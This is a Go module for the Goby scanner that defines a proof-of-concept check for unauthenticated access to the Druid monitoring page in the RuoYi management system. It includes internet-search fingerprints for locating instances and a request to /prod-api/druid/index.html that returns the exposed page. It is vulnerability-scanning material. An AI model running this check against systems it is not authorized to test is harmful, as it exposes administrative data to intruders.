package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "RuoYi Manager System Unauthorized Vulnerability",
    "Description": "<p>Ruoyi management system is a permission management system based on SpringBoot.</p><p>The RuoYI management system uses Druid, and anonymous access is enabled by default. An attacker can control the entire system through an unauthorized access vulnerability, resulting in an extremely insecure system.</p>",
    "Product": "RuoYi-Management-System",
    "Homepage": "http://ruoyi.vip/",
    "DisclosureDate": "2021-04-20",
    "Author": "qiaoshubo",
    "FofaQuery": "body=\"/ry-ui.css\" || body=\"/ry-ui.js\" || title=\"若依管理系统\" || body=\"src=\\\"/ruoyi.png\" || body=\"href=\\\"/ruoyi/css/\" || body=\"content=\\\"RuoYi\"",
    "GobyQuery": "body=\"/ry-ui.css\" || body=\"/ry-ui.js\" || title=\"若依管理系统\" || body=\"src=\\\"/ruoyi.png\" || body=\"href=\\\"/ruoyi/css/\" || body=\"content=\\\"RuoYi\"",
    "Level": "1",
    "Impact": "<p>The RuoYI management system uses Druid, and anonymous access is enabled by default. An attacker can control the entire system through an unauthorized access vulnerability, resulting in an extremely insecure system.</p>",
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.8",
    "Is0day": false,
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"http://ruoyi.vip/\">http://ruoyi.vip/</a></p>",
    "Translation": {
        "CN": {
            "Name": "若依管理系统未授权访问漏洞",
            "Product": "若依管理系统",
            "Description": "<p>若依管理系统是一款基于SpringBoot的权限管理系统。</p><p>若依管理系统使用了Druid，默认开启了匿名访问，攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p><span style=\"color: rgb(51, 51, 51); font-size: 16px;\"></span>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://ruoyi.vip/\">http://ruoyi.vip/</a></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">若依管理系统使用了Druid，默认开启了匿名访问，攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。</span><br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "RuoYi Manager System Unauthorized Vulnerability",
            "Product": "RuoYi-Management-System",
            "Description": "<p>Ruoyi management system is a permission management system based on SpringBoot.</p><p>The RuoYI management system uses Druid, and anonymous access is enabled by default. An attacker can control the entire system through an unauthorized access vulnerability, resulting in an extremely insecure system.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"http://ruoyi.vip/\">http://ruoyi.vip/</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">The RuoYI management system uses Druid, and anonymous access is enabled by default. An attacker can control the entire system through an unauthorized access vulnerability, resulting in an extremely insecure system.</span><br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "References": [
        "http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE.html"
    ],
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/prod-api/druid/index.html",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "View JSON API",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "druid.index.init()",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/prod-api/druid/index.html",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "View JSON API",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "druid.index.init()",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Tags": [
        "Unauthorized Access"
    ],
    "PocId": "9936"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
